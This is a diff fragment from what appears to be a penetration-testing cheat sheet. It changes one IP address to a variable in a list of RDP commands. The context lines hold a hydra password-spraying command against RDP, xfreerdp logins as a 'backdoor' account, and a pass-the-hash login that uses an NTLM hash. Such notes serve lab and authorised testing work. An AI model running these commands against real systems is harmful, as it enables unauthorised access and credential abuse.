@@ -25,7 +25,7 @@ hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://
 ````
 xfreerdp /cert-ignore /bpp:8 /compression -themes -wallpaper /auto-reconnect /h:1000 /w:1600 /v:192.168.238.191 /u:admin /p:password
 xfreerdp /u:admin  /v:192.168.238.191 /cert:ignore /p:"password"  /timeout:20000 /drive:home,/tmp
-xfreerdp /v:192.168.152.153 /u:backdoor /p:Password123 /cert:ignore +clipboard
+xfreerdp /v:$ip /u:backdoor /p:Password123 /cert:ignore +clipboard
 xfreerdp /v:10.1.1.89 /u:USERX /pth:5e22b03be22022754bf0975251e1e7ac
 rdesktop -u 'USERN' -p 'abc123//' 192.168.129.59 -g 94% -d example
 ````
